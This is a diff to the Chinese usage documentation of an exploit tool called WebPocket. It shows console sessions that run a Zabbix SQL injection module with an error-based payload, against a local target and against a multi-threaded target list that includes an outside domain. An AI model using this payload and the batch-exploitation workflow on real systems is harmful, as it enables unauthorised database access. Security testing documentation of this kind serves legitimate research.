@@ -38,7 +38,73 @@
 常用命令
 ==================
 
+对单目标执行POC/EXP
+-------------------
+
+此处以 ``exploits/http/zabbix/zabbix_latest_php_sqli`` 模块为例，对目标 ``http://127.0.0.1:8080`` 执行。 ::
+
+    WebPocket > use exploits/http/zabbix/zabbix_latest_php_sqli
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > show options
+    Module options:
+
+    name     required    description                            value
+    -------  ----------  -------------------------------------  ---------------------------------
+    URL      True        The url to be tested
+    TIMEOUT  True        Connection timeout                     5
+    THREADS  True        The number of threads                  1
+    SQL      True        The SQL statement you want to execute  updatexml(0,concat(0xa,user()),0)
+
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > set URL http://127.0.0.1:8080
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > check
+    [+] Check success!
+    [+] URL:http://127.0.0.1:8080 has the vulnerability
+    [*] module execution completed
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > exploit
+    [+] Exploit success!
+    [+] Exploit result: root@172.18.0.4
+    [*] module execution completed
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) >
+
+首先 ``use`` 模块，然后使用 ``show options`` 查看需要设置的参数。
+
+最后使用 ``check`` 或者 ``exploit`` 执行检查/测试。
+
+对多个目标执行POC/EXP
+-----------------------
+
 首先执行 ``python WebPocket.py`` 进入交互式命令行。
+
+当要对多个目标执行POC的时候，可以把目标写入到txt文件，然后使用 ``set URL -f target.txt`` 传入。例如： ::
+
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > use exploits/http/zabbix/zabbix_latest_php_sqli
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > show options
+    Module options:
+
+    name     required    description                            value
+    -------  ----------  -------------------------------------  ---------------------------------
+    URL      True        The url to be tested
+    TIMEOUT  True        Connection timeout                     5
+    THREADS  True        The number of threads                  1
+    SQL      True        The SQL statement you want to execute  updatexml(0,concat(0xa,user()),0)
+
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > set URL -f url.txt
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > set THREADS 20
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > exploit
+    [+] Exploit result: root@172.18.0.4
+    [+] Exploit result: root@172.18.0.4
+    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
+    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
+    [+] Exploit result: root@172.18.0.4
+    [+] Exploit result: root@172.18.0.4
+    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
+    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
+    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
+    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) >
+
+相信你也看到了，可以设置 ``THREADS`` 来设置线程数，支持多线程执行 :)
+
+所有命令
+==================
 
 help
 -----------
